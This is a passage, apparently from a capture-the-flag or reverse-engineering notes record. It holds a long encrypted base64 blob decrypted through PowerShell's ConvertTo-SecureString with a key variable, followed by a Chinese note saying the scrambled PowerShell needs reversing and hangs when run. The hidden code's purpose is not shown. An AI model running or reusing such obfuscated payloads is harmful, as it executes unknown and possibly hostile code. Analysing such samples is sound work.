1AGQAMQA1ADIAYwAyADEANwA4ADAAZgA2ADgAZABiADMAZAAwADcANABkADAAOQA3ADIAZQBjADEAMAA2AGQAMQBhADcANQBiADgAYwBmAGMAOQA5AGYAZQBjADIAOAA4AGEAYQBjADUANQA0AGQAYQA1AGUAMABkADgAMwAwADkAYwA1ADcAMQBhADUANgAxAGYAMwAzAGQAMwAwAGMAZgA3AGEAZQA0ADQAZABhAGUAYwBiADIAMAA0ADUANQBlAGYAYQA5AGQAMQBjADIAMQA2AGUAYQAyADkAZAA4AGEAZgA0ADUAOQBhAGEAYwA5AGEAZgAwADgAOQBjAGUAOQAwAGQAOQBjADUAYwAzAGMAZgA2ADYAMQBiADQAYgA1AGQAOQAzAGUAMgBhAGQANAAwADQANwA5ADgAMgBmAGEANQBjADUAYgAwADcAMwBlAGIANQA2ADAANgBkADMAMABmADkANwBjAGYANwA3AGYAMQA1ADgANQBlAGQAYgA3ADMAYgBhAGQAOQA0ADUAMABkADcAZQBlADcAOQAxADQAMgA5ADIAYQAwAGUAYgA4ADQANgA0ADYAOABjADAAYQA3ADgAOABjADAAYQAzAGEAOABlADUAMQA4ADUAMgAxADUAOQBjADQAYgAwAGYAOQA1AGMAMAAwADEAMgBhADQAYwA5AGUAYgA3ADkAZQBlADQAMwA5ADkANwA5AGUAYQBhADYAMwAxADcAMgBjADAAYQBjADQANwAwADQANQA1ADcAYgA0ADAANABlAGIANgBiAGYAOAA2ADEANwAyADIAZABhADcAOQBhADYAOQA2AGUAMgBiAGYANgA4ADEAOQA1AGEAOQA2ADUAYQAyADMAZAAxAGYAZgA5ADEANwA2ADkAYgAyADcANwA5ADcAYgA1ADEAOAAzADgAYgAwADcAMgBhADYAZgA5ADUAOAAzADcAMgA1ADEAOAA0ADIANQBiAGYAMwBhADkAOQAxAGIAMABiADYAYQA0ADcAMABlADkANwAxAGMAOQBjAGYAYgAyADMANAAzADYANwAyADQANgBmAGUAZgA2AGQAYQA4ADkAMgAzADkAMwA2AGMANwBkAGIAOQBlAGEAZABlADkAYwA2ADUAZgBlAGMAZAA5AGUAYQA2ADcAZQBkADUANQBhADkAYwAyADUAMABmAGEAMAA5ADQANAAxADYAOAAzADEANwBjAGEAZQAzADAAYwAyADUANgA1ADYAMwA1ADIAMAA3ADcAMgBmADIAZgA0AGQANQBhAGUAMwA1ADYAOABjADMAMQBiADIAYwA5AGIAZAAxADkANQA5ADMANQAyADAAMwAyAGYAMQAxADkAYwA2ADEAOQBiADIAOABmAGEAOAAxAGUAMQAyAGYAZgA2ADQAMwAyAGMANABjAGMANQA2ADgAOQA0ADYAZAAxAGMAMQA3AGQAZgBhAGUAOQA2AGEAZQAyAGMAZQBjAGEAZQBjADMAYgA4ADIAMABiAGMANAAyAGQAZgAzAGQAZgAxADYAZgA3ADEAMQA0ADkAZgA4ADQANgBhADMAZABhADEANAA2AGQAZABjADIAMABiAGMAMgBmADgAMQBjADQAZQAwADYANwA5ADYAZgA0ADgAZgBlAGIANQA2AGYAMQAxADgANgBmADAAOAAxADkANQAxADkAOQA1ADMAMgAyADMANgBhADUANQA3AGQAZQA5ADIAZQAzADYAZAAzAGMANAA2ADcAMgA3AGMAMgAzADEAYQBmAGMAMAAwADMAMwBlAGEAYgAzAGEAZgBmADcAYwA4AGQAMQBiAGYAMQBmAGYAMAA5ADcAYQAzADYAOAAxAGYAOAAyADgANgBkADAANgBmADUAZgA0AGEAMgAyAGEAZgA4ADYAYgAzADgAMgAxAGYANgBlADAANwBjADkANwA3ADYAMQA5AGUAOAA5AGEAMAA3ADUAMAAwADUANQA3ADkAYwAwADcANAA4ADAAYQAwADMANgAxADMANwBkAGIAOAA0ADAAZgAwAGEANwBlADEANwA4AGYANwA2ADYAYwBiAGUAMQA2ADQAZQA0AGYAMQA2ADQAMgBjADIAMgBkAGUAOAA0AGQAYgA3ADAAMgBlAGYAZAA5ADQAOQA3AGYANwA1AGMAMQA1ADgAMwA3ADUAZgA5ADAAYwA4ADcAOQBlADYAOQAzAGYAMQBjADcANQA2ADMANwBmAGIAMQA1ADAAZABmADIAYQAyADQAMgA1AGIAYwA2ADUANAAwAGMAYQBhADcANQAwAGQAYQA3ADIAZgBjAGUANQAzAGQAZABjADQANgAzAGUANABhADIAYQA5ADIAZQA3ADUAYwAyAGYAZQA2ADMAOQA4ADMAZQAzAGMANgA3ADUAMwAwAGMAZAA4ADEAMQBmADUANABhAGIANAA2ADUAOABlADEAMgBmAGIAYQA0ADMANwA4ADUANwAwADQAYQBjADEAYwAzADIAZQBmAGQAMAA2ADgAYgA3AGEANgBiAGIAZQBjAGIANwA0ADIANgAwADEAOQA2AGYAMwAwADEAMAA5AGUANwBhADkAZAA3AGEAYQA4AGIAMwBhADIAMgBkADEAOQBjADYAOABiAGMAOABiADMAYQAwADYANQBiADcANwA1AGMAZQAyADcAMAAwADYANABkADEAYwBiADkAYgA1AGEAYwBjAGMANgA3AGIAZAA1ADEAYgA4AGEAYwBiAGQAMgBiADkAZgBlADgANwAxADMANQBmAGIAZQAzAGUAOAAyAGEAZQA2ADgANQBmADMAYwA1AGYANABhADIAMQBhAGIANQA0ADgANQAyAGIAYgA5AGUAZgAwADIAZQAwAGUAZAA1AGMAYQAyADQANAAxAGQANgBiADAAZQA4ADUAYQA5ADIAYQA1AGIAMQAyADcAYQBlADIAMQA4ADYANAAwAGYAZAAyAGUAZQA2ADAAZABmADIAZQA2ADYAZQA0ADQAZABlAGQAOAA5AGIAZQBjAGMANAA0AGYAYwBjADkAYQA5AGQAMwAxADYANQBlADQAZAAxADIANQA4AGUAMAAwAGYAYgAwAGQAYQA0ADUAOABmADcAOABmAGIAMwBjADUAOAA1ADcAYQAwADYAZAAxAGIAMQBiAGQANwA4ADUAMwA5ADEAMABiAGIANgA3AGEAMgAzAGQAMwA4ADUAOAA5AGEANwAwADYAOAAzADAANwAwADQAOQBjADAANwBmAGUAOAA3AGYAOQBjAGEAMgBmADQANgA5ADcANgAzAGMAMABhADUAYQA4AGYAYgBmADUANwAyADMANQBjADYAZQAwADMAYgBhAGMAYQBjAGIAOQBiAGMAOQBkAGYAMQBmAGQAOQA3ADYAMQBlADUAMAAzAGEAOAAwADkAOQA5ADgAMABhADQANAA1AGQAMgA5AGIAYQBlAGIAYwBjAGMAZQAzADUAOABhADIAOAA4ADkAMwAyADEANQA4ADMAMAAxADkAMQAwAGUAZgA2ADAANQAwAGEAMABkADQAYwBhAGEAOQA2ADQAZgBhAGMANgBmAGEAYQBhADQAMgAxAGIAYwAxADAAYwBhAGQAMwA1AGQANQA4ADQANwBkADAAMQBlADEAYgAyADcAMQAxADAAMABiADEANwAzADYAZgA0ADkAZgBjAGIAYgA5AGUAMgAyADMAMAAzAGMAYwAyADIAYgAwADkAMQAwADAAMwA2AGUANAA1ADcAOQBmADYANAA0ADUAZAAwADEAYQAxADIAOAA5ADQAOQBlAGQANQA2ADYAMwAwADIAZQAzADgAZAA3ADUAMAA5ADAAYQAzADAAOQBjADcAZABlADIAYQA1AGIAMQAzAGEAMgAxAGIAZgBmADgANQA3AGUAOAAxADQAZQA1ADcANABhAGMAZgA0ADAAMQBmAGEANAA4ADIANAAwAGQAZgA1ADgANAAzAGIANQA5ADcANQBiAGYAMQAzADUAZABhADAAOQA2ADMAYQBlAGYAZAA5ADYAMAA3AGMAZQBmADIAZQA0ADAAMQBhADAAMQA5AGMANQA1AGQAYQBiADgANwA3ADYAMABmAGEAMQAzADEAYgAyADUAZgA0ADgAMgA1ADgAMwBjAGMANAA5ADMAZgAzADUAOQA4ADQAOQBhAGIANQA0ADkAZgA5AGYANgAxADIANAA4AGEAMgBiADgANQAxAGMAZgBmAGMAOQAyAGQAYgAwADcAZAA3AGYAYwBkAGMANAA5ADMAZAA2AGEAYwAwADgANgA1ADAAYwBmAGIAYwBlADcAOABhADcANgA5ADMAZgBmADAAMwAwADgANAA0ADgAMQAyADgAZQA5AGIANgAyAGEAYQA3AGMAOQBiAGIAMwBjAGUANQAwADQAZAA5AGEAMgAzADQAMAA3ADcAYgBjADMANgAzAGIAMQA4ADUAZQBhADYANAA4ADQAMgAzADYANQBhADYAYQA0AGUAMgA0AGYAMAAxADUAYwBjADEAOABkAGQAMgA2AGUANAA5ADgAMQBmAGUAMQA3AGUANwA3AGYAMgAwADQAMwAyADUAOQA4AGEAYgBiADAANABkAGQAMgBmADUANQA4AGIANgBmADUANQA3ADgAZAA0AGIAMQBhAGYAOQBlAGIANgBkAGIAOABkADQANAAzADgAYwA1ADcAZQBiAGIAYwAwADgAYwA0AGUAOQAyAGQAZAA3ADcAZAA5ADEANwA3ADMAZQA1ADkAOQBmADkAOABkADIAMABhAGMAZAA5AGYAYQA5ADAANgBhAGQAZgA4ADEANAAzADQAZgBlAGYANABlADAAYgA4AGEAZAA5ADAAOABmADkANgA4ADMAOQA2ADUAZQA3ADAAYgAxADQAZAAyADYANgAyADkANABlAGEAMgA4AGMAMABkADcAZABhAGIAYgBlAGQAYwBiADAAMwA0AGMAMAAxAGUAZABlADMAZAA2ADcAOQA2AGMAYwAxADAANAAyAGIAYgBmADEAMQAxADAAYQBjADMAMAA2AGMAYQBhAGMAMgA5AGYAZQA3ADkANQA0AGQAMwA0ADYAMQBjADMAMwAyAGEAYwAxADMANwA5AGMAMQBhADcAMAAxADcAZgAyADMANgA3ADgAMAA0ADMAMgBhADkAYwAyADEAMwBkAGQAYwBkAGEAMwA3ADQAZAAwADEAYwAyADQANgBjADgAOAA1ADkAMwA0ADkANgA5ADQAYwA4AGEANAA3ADEANwAxADcAOAAwADEANAAxAGYAOQA5ADcAYwBiADEAZgBhAGEANABiADEANwA2AGIAOQAyADMANQBiADAAOAAzAGYAYQA4ADcAZABkAGEAMAAyADgAMwAxAGQAOQA5ADIAYgBlAGEAZABiADYANQA3AGQAZgBjAGEAYQA4ADMAMABlADIAMgA5ADkAYQA1AGMANwAwADQANwA2ADcAYgA1AGEAMgAyADkAMAA3ADMAMwBjAGQAZgAwADAAMQA3ADUAYgBjADYAYgAwAGIAYwBkAGQAZgAxAGEAZQA2ADMANAA5AGQAYQA0ADgAYwBlAGQAMQBjADAAYwBkADMAYgBmADgAMwA1AGEAZABlADAAYwA3ADQAYwA1ADEAZABhAGIAMQA5ADQAOQBiADgAMAAzAGQAYwBlADEAYgAwAGIAOQA5ADAANAA5ADQAZgA5AGIAZAA5AGYAMwBiADMAZQA4ADgAYgBjADQAMABhADcAZgBiADAAZAAxAGUAYwA0AGMAYQA0AGIANAA5ADEAMwBhADEANQA1ADgAMgAxAGQAMwA1ADQAYgAzAGQAMAAyAGUANgAwAGEAYQAxADAANgBjADYAYgA5ADEAZABhADAANwBjAGEAMwA5AGEANwBmADgAMwBhAGIAYwA4ADYAMwAyADIAMgA2ADgANAA2AGMAZAAzADAAYgBhADgAOAA3ADAAMgA5AGMAZgA4AGMAZQBhADMANgA3ADgAZgBlADEAYwA5AGUAMQA4AGIAYwBjADYAYwA3ADUAZABhADMAYgAyADYAYQBmADAAMgA5ADIANQA4ADYAOAAxADkAZgBhADgAMwA2ADIAYQBhAGQAZgA3ADQAMABhADQAMgAyADIAMABkAGEAZAAwADEANgAxADUAZABhAGEAOQBlAGMAYwAxADUANQBkAGUAOQBhADgAZgAwAGYANQBiAGYAZQA3AGUAOQBiADEAYwBjADMAYwBkAGEANwBlAGEAZQBlADEAZAAwADUAMAAzADcAOQBjAGIAMgA5ADIAZQBmADMAOABkADgAZgAyADUAZgA1ADQAMwA3ADkANgA3ADgANAA0ADYAZQA3ADUANwA0AGMAOABmAGMAOQBjADkAZAA4ADYAYgBiAGQAYQBmADkAMgBhAGEAYwBhADYAZQAwADgAYQA4ADQANQBjADkAYgAxAGMANwAwAGUANQA0ADIAYgBkADUAYgAxADAAMgAyADAANABlADMAMQBiAGMANABhAGIAMQA3ADkAOAAwAGIAMgBlADUAYgBiAGEANQBlADgANwA3ADYAYQA0AGIAYQBhADcAMwAxAGUAOABjAGIANgA4ADkAOQBlADAAOAAyADUANAAyADEANAAxADYANgBkADUAZAA5ADMAOAA0ADEAYgAwADUAMwA0ADYAYQAyADEANABjAGMANABhAGEANgBlADEANwBhAGMANwBiADMAZAAxAA==\u0026#39; | COnVErtTo-SecUrEStrING -Ke $Carr))) :::\nRecon # 是一隻scramble過的power shell code，要慢慢逆，可以直接跑動態，但不知道為啥，跑到第56行會跑超久\n"}]